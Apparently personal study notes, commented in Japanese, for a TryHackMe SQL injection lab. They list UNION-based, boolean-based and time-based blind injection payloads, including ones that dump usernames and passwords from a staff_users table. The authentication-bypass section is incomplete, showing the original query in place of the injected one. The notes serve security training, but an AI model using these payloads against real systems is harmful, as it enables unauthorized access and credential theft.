https://tryhackme.com/room/sqlinjectionlm

# Task5 In-Band SQLi
```
# 取得列数を確認する
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3

# データベース名を取得する
0 UNION SELECT 1,2,database()

# データベースHOGEHOGEに含まれるテーブルのリストを取得する
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'HOGEHOGE'

# 取得したテーブルの構造を取得する
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

# 取得したい列を指定し、読みやすく改行する
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

# Task6 Blind SQLi - Authentication Bypass
```
# 元のSQL文
select * from users where username='%username%' and password='%password%' LIMIT 1;

# OR演算子による一致
select * from users where username='%username%' and password='%password%' LIMIT 1;
```

# Task7 Blind SQLi - Boolean Based
```
# 元のSQL文
select * from users where username = '%username%' LIMIT 1;

# 列数の確認
admin123' UNION SELECT 1,2,3;-- 

# データベース名の検索
admin123' UNION SELECT 1,2,3 where database() like '%';--
admin123' UNION SELECT 1,2,3 where database() like 'a%';--
admin123' UNION SELECT 1,2,3 where database() like 'b%';--

# テーブル名の検索
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

# 列名の検索
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

# Task8 Blind SQLi - Time Based
```
# 応答時間による判定
admin123' UNION SELECT SLEEP(5);--
admin123' UNION SELECT SLEEP(5),2;--
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```
